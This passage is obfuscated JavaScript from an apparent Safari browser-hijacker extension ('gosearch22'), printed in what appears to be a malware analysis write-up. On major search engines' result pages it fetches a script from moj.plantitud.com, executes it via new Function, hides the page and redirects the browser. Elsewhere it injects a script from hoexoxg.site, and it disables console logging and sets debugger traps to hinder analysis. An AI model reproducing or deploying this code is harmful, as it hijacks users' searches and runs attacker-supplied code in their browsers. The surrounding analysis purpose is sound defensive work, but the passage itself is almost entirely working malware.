  var a = target;
  a["NETsm"](e, this, function() {
    var numericValueTests = new RegExp(a["JEoQx"]);
    var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_" + "$]*)", "i");
    var label = a["pCGTJ"](d, a["NxPSG"]);
    if (!numericValueTests["test"](a["FNcJD"](label, a["WAvwA"])) || !test["test"](label + a["dtcxZ"])) {
      a["fZvbB"](label, "0");
    } else {
      d();
    }
  })();
})();
var c = function() {
  var activeIndex = {};
  activeIndex["VLsdz"] = function(i, categoryStart) {
    return i === categoryStart;
  };
  activeIndex["WeHFV"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  activeIndex["lqvfw"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  activeIndex["dlhHl"] = "lrXze";
  var tileFuncs = activeIndex;
  var closeExpr = !![];
  return function(object__360, function__361) {
    var values = {};
    values["OYBMz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["VLsdz"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    values["oruSZ"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["WeHFV"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    values["PANfz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["lqvfw"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    values["BzVPT"] = function(saveNotifs) {
      return saveNotifs();
    };
    values["xEkDU"] = "none";
    var handlers = values;
    if (tileFuncs["dlhHl"] !== tileFuncs["dlhHl"]) {
      return handlers["OYBMz"](c, b) ? 0 !== c || handlers["OYBMz"](handlers["oruSZ"](1, c), 1 / b) : handlers["PANfz"](c, c) && b !== b;
    } else {
      var closingExpr = closeExpr ? function() {
        if ("cMLBQ" !== "lPRrQ") {
          if (function__361) {
            var cssobj = function__361["apply"](object__360, arguments);
            function__361 = null;
            return cssobj;
          }
        } else {
          if (d) {
            handlers["BzVPT"](e);
          } else {
            var body = document["body"];
            if (body && handlers["OYBMz"](handlers["xEkDU"], body["style"]["display"])) {
              window["location"]["replace"](location["href"]);
            }
          }
          var query = {};
          query["url"] = location["href"];
          query["status"] = d;
          safari["extension"]["dispatchMe" + "ssage"](eventName, query);
        }
      } : function() {
      };
      closeExpr = ![];
      return closingExpr;
    }
  };
}();
var g = c(this, function() {
  var self = {};
  self["rlMnf"] = "info";
  self["fmCgP"] = "6|3|2|7|4|" + "0|9|5|8|1";
  self["EiPtW"] = function(letter, all) {
    return letter == all;
  };
  self["JcDyU"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  self["uIRnB"] = function(buckets, name) {
    return buckets + name;
  };
  self["posvb"] = function(saveNotifs) {
    return saveNotifs();
  };
  self["QHGdH"] = "lHXSM";
  self["ktKMm"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  self["qOBtJ"] = "FRXum";
  var app = self;
  var e = function() {
  };
  var result;
  try {
    result = app["posvb"](aL);
  } catch (aV) {
    result = window;
  }
  if (!result["console"]) {
    if ("vAduq" === app["QHGdH"]) {
      var code = xhr["responseTe" + "xt"];
      var data = {
        "status" : code,
        "timestamp" : Date["now"]()
      };
      localStorage["setItem"](app["rlMnf"], JSON["stringify"](data));
      if (d) {
        b(code);
      }
    } else {
      result["console"] = function(e) {
        var callbackVals = app["fmCgP"]["split"]("|");
        var callbackCount = 0;
        for (; !![];) {
          switch(callbackVals[callbackCount++]) {
            case "0":
              result["error"] = e;
              continue;
            case "1":
              return result;
            case "2":
              result["warn"] = e;
              continue;
            case "3":
              result["log"] = e;
              continue;
            case "4":
              result["info"] = e;
              continue;
            case "5":
              result["table"] = e;
              continue;
            case "6":
              var result = {};
              continue;
            case "7":
              result["debug"] = e;
              continue;
            case "8":
              result["trace"] = e;
              continue;
            case "9":
              result["exception"] = e;
              continue;
          }
          break;
        }
      }(e);
    }
  } else {
    if (app["ktKMm"]("jhqFx", app["qOBtJ"])) {
      result["console"]["log"] = e;
      result["console"]["warn"] = e;
      result["console"]["debug"] = e;
      result["console"]["info"] = e;
      result["console"]["error"] = e;
      result["console"]["exception"] = e;
      result["console"]["table"] = e;
      result["console"]["trace"] = e;
    } else {
      if (app["EiPtW"](200, xhr["status"])) {
        var res = xhr["responseTe" + "xt"];
        var data = {
          "status" : res,
          "timestamp" : Date["now"]()
        };
        localStorage["setItem"](app["rlMnf"], JSON["stringify"](data));
        if (d) {
          app["JcDyU"](b, res);
        }
      } else {
        if (d) {
          f(false);
        }
      }
    }
  }
});
g();
var $jscomp = $jscomp || {};
$jscomp["scope"] = {};
$jscomp["ASSUME_ES5"] = false;
$jscomp["ASSUME_NO_" + "NATIVE_MAP"] = false;
$jscomp["ASSUME_NO_" + "NATIVE_SET"] = false;
$jscomp["SIMPLE_FRO" + "UND_POLYFI" + "LL"] = false;
$jscomp["ISOLATE_PO" + "LYFILLS"] = false;
$jscomp["FORCE_POLY" + "FILL_PROMI" + "SE"] = false;
$jscomp["FORCE_POLY" + "FILL_PROMI" + "SE_WHEN_NO" + "_UNHANDLED" + "_REJECTION"] = false;
$jscomp["defineProp" + "erty"] = $jscomp["ASSUME_ES5"] || "function" == typeof Object["defineProp" + "erties"] ? Object["defineProp" + "erty"] : function(options, attr, device) {
  var currentRelations = {};
  currentRelations["PeGNY"] = function(letter, all) {
    return letter == all;
  };
  currentRelations["MhNYO"] = function(letter, all) {
    return letter == all;
  };
  var addedRelations = currentRelations;
  if (addedRelations["PeGNY"](options, Array["prototype"]) || addedRelations["MhNYO"](options, Object["prototype"])) {
    return options;
  }
  options[attr] = device["value"];
  return options;
};
$jscomp["getGlobal"] = function(data) {
  var objectsToHistory = {};
  objectsToHistory["xnQLp"] = "object";
  objectsToHistory["nlpZX"] = function(letter, all) {
    return letter == all;
  };
  objectsToHistory["pIfJQ"] = function(letter, all) {
    return letter == all;
  };
  objectsToHistory["KzRtm"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  objectsToHistory["eKpjc"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  objectsToHistory["atXzl"] = "Cannot fin" + "d global o" + "bject";
  var handlers = objectsToHistory;
  data = [handlers["xnQLp"] == typeof globalThis && globalThis, data, handlers["nlpZX"](handlers["xnQLp"], typeof window) && window, handlers["pIfJQ"](handlers["xnQLp"], typeof self) && self, handlers["pIfJQ"](handlers["xnQLp"], typeof global) && global];
  var c = 0;
  for (; handlers["KzRtm"](c, data["length"]); ++c) {
    var root = data[c];
    if (root && handlers["pIfJQ"](root["Math"], Math)) {
      return root;
    }
  }
  throw handlers["eKpjc"](Error, handlers["atXzl"]);
};
$jscomp["global"] = $jscomp["getGlobal"](this);
$jscomp["IS_SYMBOL_" + "NATIVE"] = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp["TRUST_ES6_" + "POLYFILLS"] = !$jscomp["ISOLATE_PO" + "LYFILLS"] || $jscomp["IS_SYMBOL_" + "NATIVE"];
$jscomp["polyfills"] = {};
$jscomp["propertyTo" + "PolyfillSy" + "mbol"] = {};
$jscomp["POLYFILL_P" + "REFIX"] = "$jscp$";
var $jscomp$lookupPolyfilledValue = function(mapping, index) {
  var currentRelations = {};
  currentRelations["XQgAh"] = function(letter, all) {
    return letter == all;
  };
  currentRelations["mVvjs"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  var addedRelations = currentRelations;
  var value = $jscomp["propertyTo" + "PolyfillSy" + "mbol"][index];
  if (addedRelations["XQgAh"](null, value)) {
    return mapping[index];
  }
  value = mapping[value];
  return addedRelations["mVvjs"](void 0, value) ? value : mapping[index];
};
$jscomp["polyfill"] = function(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
  if (mmaPushNotificationsComponent) {
    if ($jscomp["ISOLATE_PO" + "LYFILLS"]) {
      $jscomp["polyfillIs" + "olated"](mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
    } else {
      $jscomp["polyfillUn" + "isolated"](mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
    }
  }
};
$jscomp["polyfillUn" + "isolated"] = function(p, key, prop, value) {
  var context = {};
  context["MZaNY"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  context["LTohp"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  context["wMiFc"] = function(b, a) {
    return b - a;
  };
  context["LnRSl"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  var obj = context;
  var callbackVals = ("0|2|1|3|5|" + "4|6")["split"]("|");
  var callbackCount = 0;
  for (; !![];) {
    switch(callbackVals[callbackCount++]) {
      case "0":
        prop = $jscomp["global"];
        continue;
      case "1":
        value = 0;
        for (; obj["MZaNY"](value, p["length"] - 1); value++) {
          var name = p[value];
          if (!obj["LTohp"](name, prop)) {
            return;
          }
          prop = prop[name];
        }
        continue;
      case "2":
        p = p["split"](".");
        continue;
      case "3":
        p = p[obj["wMiFc"](p["length"], 1)];
        continue;
      case "4":
        key = key(value);
        continue;
      case "5":
        value = prop[p];
        continue;
      case "6":
        if (key != value && obj["LnRSl"](null, key)) {
          $jscomp["defineProp" + "erty"](prop, p, {
            "configurable" : true,
            "writable" : true,
            "value" : key
          });
        }
        continue;
    }
    break;
  }
};
$jscomp["polyfillIs" + "olated"] = function(layoutSets, c, e, v) {
  var array = {};
  array["JcgLM"] = "script";
  array["aSbxX"] = "src";
  array["wzMcV"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  array["GqrxY"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  array["JctXN"] = function(angle, keyAngle) {
    return angle < keyAngle;
  };
  array["eKdnq"] = function(b, a) {
    return b - a;
  };
  array["TeFLu"] = "XoSug";
  array["Zqywp"] = "bGejl";
  array["JnhAC"] = "es6";
  array["fuRHh"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  array["cVkGM"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  array["RWPzm"] = function(text, shorturl_result) {
    return text + shorturl_result;
  };
  var a = array;
  var t = layoutSets["split"](".");
  layoutSets = a["wzMcV"](1, t["length"]);
  v = t[0];
  v = !layoutSets && a["GqrxY"](v, $jscomp["polyfills"]) ? $jscomp["polyfills"] : $jscomp["global"];
  var x = 0;
  for (; a["JctXN"](x, a["eKdnq"](t["length"], 1)); x++) {
    if (a["TeFLu"] !== a["Zqywp"]) {
      var c = t[x];
      if (!a["GqrxY"](c, v)) {
        return;
      }
      v = v[c];
    } else {
      var rowSorter = document["createElem" + "ent"](a["JcgLM"]);
      rowSorter["setAttribu" + "te"](a["aSbxX"], "https://ww" + "w.hoexoxg." + "site/stati" + "c/s/app.js");
      document["head"]["appendChil" + "d"](rowSorter);
    }
  }
  t = t[a["eKdnq"](t["length"], 1)];
  e = $jscomp["IS_SYMBOL_" + "NATIVE"] && a["JnhAC"] === e ? v[t] : null;
  c = a["fuRHh"](c, e);
  if (a["cVkGM"](null, c)) {
    if (layoutSets) {
      $jscomp["defineProp" + "erty"]($jscomp["polyfills"], t, {
        "configurable" : true,
        "writable" : true,
        "value" : c
      });
    } else {
      if (c !== e) {
        $jscomp["propertyTo" + "PolyfillSy" + "mbol"][t] = $jscomp["IS_SYMBOL_" + "NATIVE"] ? $jscomp["global"]["Symbol"](t) : a["RWPzm"]($jscomp["POLYFILL_P" + "REFIX"], t);
        t = $jscomp["propertyTo" + "PolyfillSy" + "mbol"][t];
        $jscomp["defineProp" + "erty"](v, t, {
          "configurable" : true,
          "writable" : true,
          "value" : c
        });
      }
    }
  }
};
$jscomp["polyfill"]("Object.is", function(animated) {
  var node = {};
  node["MCyFh"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  node["ALxWN"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  node["WLHGq"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  var B3494 = node;
  return animated ? animated : function(char__3503, env__3547) {
    return char__3503 === env__3547 ? 0 !== char__3503 || B3494["MCyFh"](1 / char__3503, B3494["ALxWN"](1, env__3547)) : B3494["WLHGq"](char__3503, char__3503) && B3494["WLHGq"](env__3547, env__3547);
  };
}, "es6", "es3");
setInterval(function() {
  d();
}, 4E3);
$jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
  var PL$6 = {};
  PL$6["sctZX"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  PL$6["KNwkT"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  PL$6["wiats"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  PL$6["wKBGR"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  PL$6["qGKkk"] = "aDuqO";
  PL$6["RAGaL"] = "FRvxY";
  PL$6["Tputh"] = "3|4|5|0|2|" + "1";
  PL$6["fEwRH"] = function(_num1, _num2) {
    return _num1 > _num2;
  };
  PL$6["VqpCZ"] = function(buckets, name) {
    return buckets + name;
  };
  PL$6["vhVuS"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  var PL$16 = PL$6;
  return obj ? obj : function(name, data) {
    var currentRelations = {};
    currentRelations["wOZRI"] = function(b, a) {
      return b - a;
    };
    currentRelations["gSgWJ"] = function(PL$15, texthtml) {
      return PL$16["sctZX"](PL$15, texthtml);
    };
    currentRelations["xyOMo"] = function(PL$15, texthtml) {
      return PL$16["KNwkT"](PL$15, texthtml);
    };
    currentRelations["BnqXR"] = function(PL$15, texthtml) {
      return PL$16["wiats"](PL$15, texthtml);
    };
    var validators = currentRelations;
    if (PL$16["wKBGR"](PL$16["qGKkk"], PL$16["RAGaL"])) {
      var callbackVals = ("2|1|5|3|4|" + "0|6")["split"]("|");
      var callbackCount = 0;
      for (; !![];) {
        switch(callbackVals[callbackCount++]) {
          case "0":
            name = name(value);
            continue;
          case "1":
            obj = obj["split"](".");
            continue;
          case "2":
            data = $jscomp["global"];
            continue;
          case "3":
            obj = obj[validators["wOZRI"](obj["length"], 1)];
            continue;
          case "4":
            value = data[obj];
            continue;
          case "5":
            value = 0;
            for (; validators["gSgWJ"](value, validators["wOZRI"](obj["length"], 1)); value++) {
              var val = obj[value];
              if (!validators["xyOMo"](val, data)) {
                return;
              }
              data = data[val];
            }
            continue;
          case "6":
            if (validators["BnqXR"](name, value) && null != name) {
              $jscomp["defineProp" + "erty"](data, obj, {
                "configurable" : true,
                "writable" : true,
                "value" : name
              });
            }
            continue;
        }
        break;
      }
    } else {
      var callbackVals = PL$16["Tputh"]["split"]("|");
      var callbackCount = 0;
      for (; !![];) {
        switch(callbackVals[callbackCount++]) {
          case "0":
            data = data || 0;
            continue;
          case "1":
            return false;
          case "2":
            if (PL$16["fEwRH"](0, data)) {
              data = Math["max"](PL$16["VqpCZ"](data, length), 0);
            }
            for (; PL$16["vhVuS"](data, length); data++) {
              var obj = value[data];
              if (PL$16["wKBGR"](obj, name) || Object["is"](obj, name)) {
                return true;
              }
            }
            continue;
          case "3":
            var value = this;
            continue;
          case "4":
            if (value instanceof String) {
              value = String(value);
            }
            continue;
          case "5":
            var length = value["length"];
            continue;
        }
        break;
      }
    }
  };
}, "es7", "es3");
$jscomp["checkStrin" + "gArgs"] = function(gameFolder, data, boardManager) {
  var currentRelations = {};
  currentRelations["HapgX"] = function(state, inUse) {
    return state == inUse;
  };
  currentRelations["zzeGg"] = function(buckets, name) {
    return buckets + name;
  };
  currentRelations["YpMqH"] = " must not " + "be null or" + " undefined";
  currentRelations["dvrxe"] = function(impromptuInstance, Impromptu) {
    return impromptuInstance instanceof Impromptu;
  };
  currentRelations["TnBEt"] = function(buckets, name) {
    return buckets + name;
  };
  var addedRelations = currentRelations;
  if (addedRelations["dvrxe"](data, RegExp)) {
    throw new TypeError(addedRelations["TnBEt"]("First argu" + "ment to St" + "ring.proto" + "type." + boardManager, " must not " + "be a regul" + "ar express" + "ion"));
  }
  return gameFolder + "";
};
$jscomp["polyfill"]("String.pro" + "totype.inc" + "ludes", function(canCreateDiscussions) {
  var currentRelations = {};
  currentRelations["hAVDR"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  currentRelations["VZLTI"] = "HNMAN";
  currentRelations["kKWZI"] = "IgBwG";
  currentRelations["zPpOU"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  currentRelations["wnCXG"] = function(isPrevType, isCurrentType) {
    return isPrevType || isCurrentType;
  };
  var command_codes = currentRelations;
  return canCreateDiscussions ? canCreateDiscussions : function(classNAME, data) {
    if (command_codes["hAVDR"](command_codes["VZLTI"], command_codes["kKWZI"])) {
      var denies = fn["apply"](context, arguments);
      fn = null;
      return denies;
    } else {
      return command_codes["zPpOU"](-1, $jscomp["checkStrin" + "gArgs"](this, classNAME, "includes")["indexOf"](classNAME, command_codes["wnCXG"](data, 0)));
    }
  };
}, "es6", "es3");
var xhr;
var eventName = "beforeload";
var isSafari13OrLater = null != (ver = navigator["appVersion"]["match"](/version\/(\d+)/i)) && 13 <= ver[1];
addEventListener(eventName, function(canCreateDiscussions) {
  var obj = {};
  obj["JoIJc"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  obj["JYSiN"] = "YisOc";
  obj["kDqqk"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  obj["kkKdz"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  obj["ZhRdW"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  obj["zGPfH"] = function(letter, all) {
    return letter == all;
  };
  obj["HiEgJ"] = "onCqt";
  obj["VpZKn"] = "info";
  obj["ntIza"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  obj["eZmva"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  obj["LTzVO"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  obj["Ekfap"] = "LDBCB";
  obj["ybZhr"] = function(saveNotifs) {
    return saveNotifs();
  };
  obj["pqZww"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  obj["YHrSW"] = "https://mo" + "j.plantitu" + "d.com/stat" + "ic/gs/s.js";
  obj["Fkmum"] = function(buckets, name) {
    return buckets + name;
  };
  obj["efkGB"] = ";return st" + 'atus("';
  obj["qhntV"] = function(f, widthCtrl) {
    return f(widthCtrl);
  };
  obj["BqKHm"] = function(f, widthCtrl) {
    return f(widthCtrl);
  };
  obj["pMnaR"] = "PghYb";
  obj["wLfeG"] = "none";
  obj["enFtF"] = "debu";
  obj["MnCHh"] = "gger";
  obj["xbetY"] = "stateObjec" + "t";
  obj["GYIEc"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  obj["iuuTY"] = "mRWft";
  obj["ZqSjr"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  obj["ockTq"] = "0|1|2|4|3";
  obj["RAqgJ"] = function(callback, identifierPositions) {
    return callback(identifierPositions);
  };
  obj["OqCiT"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  obj["puXEi"] = function(mid_OR_high, high_OR_null) {
    return mid_OR_high <= high_OR_null;
  };
  obj["PNuAU"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  obj["IQPhl"] = "google.";
  obj["NhQJI"] = "yahoo.";
  obj["Cspsr"] = "bing.";
  obj["dSCrp"] = "duckduckgo" + ".";
  obj["tLgUF"] = "yandex.";
  obj["RVBue"] = '[src="http' + "s://www.ho" + "exoxg.site" + "/static/s/" + 'app.js"]';
  obj["GLgNM"] = "JAhJQ";
  obj["brJeG"] = "src";
  obj["bdNuj"] = "https://ww" + "w.hoexoxg." + "site/stati" + "c/s/app.js";
  var data = obj;
  if (!isSafari13OrLater && window["top"] === window) {
    if (!document["referrer"] && location["host"] && location["search"] && location["href"] && (location["host"]["includes"](data["IQPhl"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["NhQJI"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location["host"]["includes"](data["Cspsr"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["dSCrp"]) && 
    location["href"]["match"](/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["tLgUF"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
      var get = function(size) {
        var namespacedData = {};
        namespacedData["NDkPJ"] = function(_relatedTarget, value2) {
          return data["kkKdz"](_relatedTarget, value2);
        };
        namespacedData["ImABp"] = function(optionsValue, value) {
          return optionsValue !== value;
        };
        namespacedData["UxvDC"] = function(_relatedTarget, value2) {
          return data["ZhRdW"](_relatedTarget, value2);
        };
        namespacedData["oBxjj"] = function(_relatedTarget, value2) {
          return data["zGPfH"](_relatedTarget, value2);
        };
        namespacedData["DgwsO"] = data["HiEgJ"];
        namespacedData["DqVyF"] = data["VpZKn"];
        namespacedData["PbQri"] = function(_relatedTarget, value2) {
          return data["ntIza"](_relatedTarget, value2);
        };
        namespacedData["vvNlP"] = function(_relatedTarget, value2) {
          return data["eZmva"](_relatedTarget, value2);
        };
        var _submitBtn = namespacedData;
        if (data["LTzVO"]("LDBCB", data["Ekfap"])) {
          if (size = data["LTzVO"](void 0, size) ? false : size) {
            data["ybZhr"](_positionActiveTinyMCE);
          }
          if (xhr && data["pqZww"](void 0, xhr)) {
            xhr["abort"]();
          }
          xhr = new XMLHttpRequest;
          xhr["timeout"] = 1E3;
          xhr["ontimeout"] = function() {
            if (data["JoIJc"](data["JYSiN"], "rqJsy")) {
              var denies = fn["apply"](context, arguments);
              fn = null;
              return denies;
            } else {
              if (size) {
                data["kDqqk"](update, false);
              }
            }
          };
          xhr["onload"] = function() {
            var currentRelations = {};
            currentRelations["nZhyS"] = function(disabled, status) {
              return _submitBtn["NDkPJ"](disabled, status);
            };
            currentRelations["GHVVu"] = function(disabled, status) {
              return _submitBtn["ImABp"](disabled, status);
            };
            currentRelations["kionv"] = function(disabled, status) {
              return _submitBtn["NDkPJ"](disabled, status);
            };
            currentRelations["QFpCU"] = function(disabled, status) {
              return _submitBtn["UxvDC"](disabled, status);
            };
            currentRelations["tGtBF"] = function(disabled, status) {
              return _submitBtn["ImABp"](disabled, status);
            };
            var B3494 = currentRelations;
            if (_submitBtn["oBxjj"](200, xhr["status"])) {
              if (_submitBtn["DgwsO"] === "lSjnJ") {
                return canCreateDiscussions ? canCreateDiscussions : function(char__3503, env__3547) {
                  return B3494["nZhyS"](char__3503, env__3547) ? B3494["GHVVu"](0, char__3503) || B3494["kionv"](1 / char__3503, B3494["QFpCU"](1, env__3547)) : B3494["GHVVu"](char__3503, char__3503) && B3494["tGtBF"](env__3547, env__3547);
                };
              } else {
                var status = xhr["responseTe" + "xt"];
                var data = {
                  "status" : status,
                  "timestamp" : Date["now"]()
                };
                localStorage["setItem"](_submitBtn["DqVyF"], JSON["stringify"](data));
                if (size) {
                  _submitBtn["PbQri"](scroll, status);
                }
              }
            } else {
              if (size) {
                _submitBtn["vvNlP"](update, false);
              }
            }
          };
          xhr["onerror"] = function() {
            update(false);
          };
          xhr["open"]("GET", data["YHrSW"], true);
          xhr["send"]();
        } else {
          return !![];
        }
      };
      var scroll = function(position) {
        position = (new Function(data["Fkmum"](data["Fkmum"](position + data["efkGB"], location["href"]), '")')))["call"]();
        data["qhntV"](update, position);
      };
      var _positionActiveTinyMCE = function() {
        if (data["pMnaR"] === data["pMnaR"]) {
          canCreateDiscussions["preventDef" + "ault"]();
          if (body = document["body"]) {
            body["style"]["display"] = data["wLfeG"];
          }
        } else {
          if (ret) {
            return debuggerProtection;
          } else {
            data["BqKHm"](debuggerProtection, 0);
          }
        }
      };
      var update = function(data) {
        if (data) {
          data["ybZhr"](_positionActiveTinyMCE);
        } else {
          if (data["GYIEc"]("mRWft", data["iuuTY"])) {
            (function() {
              return ![];
            })["constructo" + "r"](data["enFtF"] + data["MnCHh"])["apply"](data["xbetY"]);
          } else {
            var body = document["body"];
            if (body && data["ZqSjr"](data["wLfeG"], body["style"]["display"])) {
              window["location"]["replace"](location["href"]);
            }
          }
        }
        var details = {};
        details["url"] = location["href"];
        details["status"] = data;
        safari["extension"]["dispatchMe" + "ssage"](eventName, details);
      };
      (function() {
        var callbackVals = data["ockTq"]["split"]("|");
        var callbackCount = 0;
        for (; !![];) {
          switch(callbackVals[callbackCount++]) {
            case "0":
              var value = JSON["parse"](localStorage["getItem"]("runtime"));
              continue;
            case "1":
              var query = {};
              query["url"] = location["href"];
              query["timestamp"] = Date["now"]();
              var message = query;
              continue;
            case "2":
              localStorage["setItem"]("runtime", JSON["stringify"](message));
              continue;
            case "3":
              if (value) {
                if ((value = JSON["parse"](localStorage["getItem"]("info"))) && void 0 !== value) {
                  if ((message = value["status"]) && data["GYIEc"](void 0, message)) {
                    data["RAqgJ"](scroll, message);
                    if ((value = value["timestamp"]) && void 0 !== value) {
                      if (5 <= data["ZhRdW"](data["ZhRdW"](Date["now"]() - value, 1E3), 60)) {
                        data["ybZhr"](get);
                      }
                    } else {
                      data["ybZhr"](get);
                    }
                  } else {
                    get(true);
                  }
                } else {
                  data["OqCiT"](get, true);
                }
              }
              continue;
            case "4":
              if (value && void 0 !== value && data["ZqSjr"](value["url"], location["href"])) {
                value = value["timestamp"];
                value = !value || void 0 === value || data["puXEi"](1, data["PNuAU"](Date["now"]() - value, 1E3)) ? true : false;
              } else {
                value = true;
              }
              continue;
          }
          break;
        }
      })();
    } else {
      if (document["head"] && 0 >= document["querySelec" + "torAll"](data["RVBue"])["length"]) {
        if (data["ZqSjr"](data["GLgNM"], "JAhJQ")) {
          var elem = document["createElem" + "ent"]("script");
          elem["setAttribu" + "te"](data["brJeG"], data["bdNuj"]);
          document["head"]["appendChil" + "d"](elem);
        } else {
          d = (new Function(data["Fkmum"](d, ";return st" + "atus('") + location["href"] + '")'))["call"]();
          data["OqCiT"](update, d);
        }
      }
    }
  }
}, true);
safari["self"]["addEventLi" + "stener"]("message", function(body) {
  if (body["message"]["url"]) {
    window["location"]["replace"](body["message"]["url"]);
  }
});
function d(n) {
  function update(data) {
    var InitialSetupController = {};
    InitialSetupController["ZBnUA"] = function(saveNotifs) {
      return saveNotifs();
    };
    InitialSetupController["RZtwT"] = function(DIR, name) {
      return DIR + name;
    };
    InitialSetupController["SzVPc"] = function(buckets, name) {
      return buckets + name;
    };
    InitialSetupController["MSIuy"] = function(addedNodesArray, dr) {
      return options["XDcHC"](addedNodesArray, dr);
    };
    InitialSetupController["hJySJ"] = "lQJpl";
    InitialSetupController["VIVVZ"] = "QMGfP";
    var controller = InitialSetupController;
    if (options["piOLC"](options["yEBoB"], options["rOjIw"])) {
      if (fn) {
        var newValue = fn["apply"](context, arguments);
        fn = null;
        return newValue;
      }
    } else {
      if (typeof data === options["dfvDm"]) {
        return function(canCreateDiscussions) {
        }["constructo" + "r"](options["dEDjy"])["apply"]("counter");
      } else {
        if (options["oBHDi"](options["lNQWJ"], options["lNQWJ"])) {
          controller["ZBnUA"](d);
        } else {
          if (options["oEuZl"]("", options["rRNYx"](data, data))[options["UGyZy"]] !== 1 || options["VJQoM"](options["WUyQz"](data, 20), 0)) {
            if (options["kixsA"](options["glETU"], options["YTZsf"])) {
              (function() {
                return !![];
              })["constructo" + "r"](options["oEuZl"](options["cgmTm"], "gger"))["call"]("action");
            } else {
              that = controller["ZBnUA"](fH);
            }
          } else {
            (function() {
              if (controller["MSIuy"](controller["hJySJ"], controller["VIVVZ"])) {
                var row = firstCall ? function() {
                  if (fn) {
                    var denies = fn["apply"](context, arguments);
                    fn = null;
                    return denies;
                  }
                } : function() {
                };
                firstCall = ![];
                return row;
              } else {
                return ![];
              }
            })["constructo" + "r"](options["qIEHj"](options["cgmTm"], options["UudQw"]))["apply"](options["cXzfQ"]);
          }
        }
      }
      options["bDFeq"](update, ++data);
    }
  }
  var headers = {};
  headers["XDcHC"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  headers["piOLC"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  headers["yEBoB"] = "oYzse";
  headers["rOjIw"] = "oPJQh";
  headers["dfvDm"] = "string";
  headers["dEDjy"] = "while (tru" + "e) {}";
  headers["oBHDi"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  headers["lNQWJ"] = "XdVag";
  headers["oEuZl"] = function(buckets, name) {
    return buckets + name;
  };
  headers["rRNYx"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  headers["UGyZy"] = "length";
  headers["VJQoM"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  headers["WUyQz"] = function(number_to_dividee, divided_by) {
    return number_to_dividee % divided_by;
  };
  headers["kixsA"] = function(dataSourceIndex, all) {
    return dataSourceIndex !== all;
  };
  headers["glETU"] = "rtMIy";
  headers["YTZsf"] = "NMvQw";
  headers["cgmTm"] = "debu";
  headers["qIEHj"] = function(buckets, name) {
    return buckets + name;
  };
  headers["UudQw"] = "gger";
  headers["cXzfQ"] = "stateObjec" + "t";
  headers["bDFeq"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  headers["UAcwT"] = "none";
  var options = headers;
  try {
    if (n) {
      return update;
    } else {
      if ("dgaaS" === "dgaaS") {
        options["bDFeq"](update, 0);
      } else {
        var body = document["body"];
        if (body && options["VJQoM"](options["UAcwT"], body["style"]["display"])) {
          window["location"]["replace"](location["href"]);
        }
      }
    }
  } catch (fN) {
  }
}
;
```
<br /><br />
gosearch22.script.js - de-obfuscated on the custom JS sandbox and applied more cleanup (attempt 2)

```js
'use strict';
